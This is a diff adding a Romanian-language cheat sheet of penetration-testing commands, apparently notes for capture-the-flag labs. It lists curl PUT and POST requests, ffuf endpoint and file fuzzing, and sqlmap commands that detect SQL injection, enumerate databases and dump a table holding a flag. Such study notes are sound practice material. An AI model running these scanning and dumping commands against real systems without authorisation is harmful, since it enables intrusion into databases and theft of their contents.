@@ -55,4 +55,17 @@
 
 
 
+7.
+`curl -X PUT [url] -d "[param1]=test&[param2]=test"` — trimite cerere HTTP PUT cu date în body, folosit când formularul HTML specifică method="PUT"
+`curl -X POST [url] -d "[param]=test"` — trimite cerere HTTP POST cu date în body, folosit pentru a interacționa cu endpoint-uri care acceptă POST
+`echo -n "[string]" | md5sum` — calculează hash-ul MD5 al unui string, `-n` elimină newline-ul care ar modifica hash-ul
+`ffuf -u http://[ip]:[port]/FUZZ -w [wordlist] -mc 200,301,302 -c` — descoperire endpoint-uri prin înlocuirea FUZZ cu fiecare linie din wordlist
+`ffuf -u http://[ip]:[port]/FUZZ -w [wordlist] -mc 200,301,302 -fs [bytes] -c` — același lucru dar filtrează răspunsurile cu o dimensiune specifică în bytes
+`ffuf -u http://[ip]:[port]/FUZZ -w [wordlist] -e .php,.db,.sqlite,.sql -mc 200,301,302 -c` — caută fișiere cu extensii specifice
+`ffuf -u http://[ip]:[port]/FUZZ -w [wordlist] -X PUT -d "[param1]=test&[param2]=test" -mc 200,301,302 -c` — fuzzing cu metodă HTTP și date în body specificate
+`sqlmap -u "http://[ip]:[port]/" --method PUT --data "[param1]=test&[param2]=test" --dbs --batch` — detectează SQLi pe parametri PUT
+`sqlmap -u "http://[ip]:[port]/page?[param]=[valoare]" -D [numebaza] --tables --batch` — listează tabelele din baza de date găsită
+`sqlmap -u "http://[ip]:[port]/page?[param]=[valoare]" -D [numebaza] -T [numtabel] --dump --batch` — extrage conținutul complet al tabelei cu flag-ul
+`sqlmap -u "http://[ip]:[port]/page?[param]=[valoare]" --dbs --batch --level 3 --risk 2 --random-agent` — când testele standard nu găsesc nimic
+
 
